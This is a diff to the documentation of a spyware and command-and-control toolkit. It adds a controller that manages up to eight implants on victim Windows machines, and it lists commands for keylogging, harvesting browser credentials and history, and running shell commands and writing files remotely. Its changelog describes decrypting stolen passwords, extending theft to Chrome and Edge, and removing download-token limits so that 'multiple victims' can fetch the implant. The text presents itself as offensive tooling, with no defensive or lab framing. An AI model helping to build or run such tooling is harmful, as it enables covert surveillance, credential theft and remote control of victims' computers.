@@ -389,7 +389,27 @@ The stager runs at **medium integrity** (browser renderer process) and cannot wr
 
 ---
 
-## C2 Controller Commands
+## C2 Controller — Concurrent Multi-Implant UI
+
+The controller now manages up to 8 simultaneous implant sessions. A background acceptor thread handles all incoming connections (enrollment, HELLO, persistence detection) while the operator UI runs on the main thread. The operator first selects which implant to task, then enters that implant's command loop.
+
+### Step 1 — Session selection
+
+When you attach to the container (`sudo docker attach c2-server`) you see the live implant list:
+
+```
++--------------------------------------------+
+| C2 Controller — Connected Implants         |
++--------------------------------------------+
+  [1] 192.168.1.50    Windows 10 Pro 19045      PERSIST:OFF
+  [2] 192.168.1.75    Windows 11 Home 22631     PERSIST:ON
+  [0] Refresh
+Select implant>
+```
+
+Enter the implant number to enter its command loop, or `0` to refresh the list.
+
+### Step 2 — Command loop for the selected implant
 
 ```
 +------------------------------------+
@@ -397,6 +417,7 @@ The stager runs at **medium integrity** (browser renderer process) and cannot wr
 | Persistence: DISABLED              |
 +------------------------------------+
 Select a command:
+  0 - BACK                       Return to implant list
   1 - HEARTBEAT                  Check implant is alive
   2 - SET_SLEEP                  Make implant sleep N seconds
   3 - SHUTDOWN    (removes implant + task)
@@ -411,13 +432,15 @@ Select a command:
  12 - KEYLOG_DUMP                Dump keylog
  13 - CRED_STEAL                 Harvest browser credentials
  14 - HISTORY_STEAL              Harvest browser history
+>
 ```
 
 | Command | What happens |
 |---|---|
+| BACK | Returns to the session selection list; selected implant stays connected |
 | HEARTBEAT | Controller sends ping; implant responds `ALIVE` over mTLS |
-| SET_SLEEP | Implant disconnects, sleeps N seconds, reconnects with jitter. |
-| SHUTDOWN | Implant deletes scheduled task + executable + credentials, exits |
+| SET_SLEEP | Implant sleeps N seconds then reconnects; session slot is released and the implant reappears as a new session after waking |
+| SHUTDOWN | Implant deletes scheduled task + executable + credentials and exits; only the selected implant is affected — controller and other sessions remain alive |
 | READ_DATA | Reads a file path on the target; returns up to 4096 bytes |
 | WRITE_DATA | Writes arbitrary data to a file path on the target |
 | RUN_CMD | Runs a shell command via `CreateProcess(CREATE_NO_WINDOW)` |
@@ -514,3 +537,6 @@ sudo docker exec -it exfil-server /bin/bash
 | 21 | `decrypt_creds.py`, `read_history.py` | Data analysis overhead | Added automated scripts to decrypt passwords and parse history |
 | 22 | `spyware.c` | Compilation error | Fixed `#ifdef` logic and header include order in modular spyware source |
 | 23 | `spyware.c` | Limited browser support | Expanded `CRED_STEAL` and `HISTORY_STEAL` to target both Edge and Chrome |
+| 24 | `controller.c` | Single-implant limitation | Rewrote controller with background `acceptor_thread` and `Session` table (up to 8 slots); operator selects implant by number from a live session list; each implant is fully independent |
+| 25 | `controller.c` | C2 output buffered on `docker attach` | Added `setvbuf(stdout, NULL, _IONBF, 0)` at startup — stdout is fully unbuffered so the session list and prompts appear immediately regardless of when the operator attaches |
+| 26 | `token_server.js` | Single-use download token blocked N-victim delivery | Removed burn-after-first-use logic; `DOWNLOAD_TOKEN` now authenticates any number of downloads so multiple victims can retrieve the implant from the same running server |
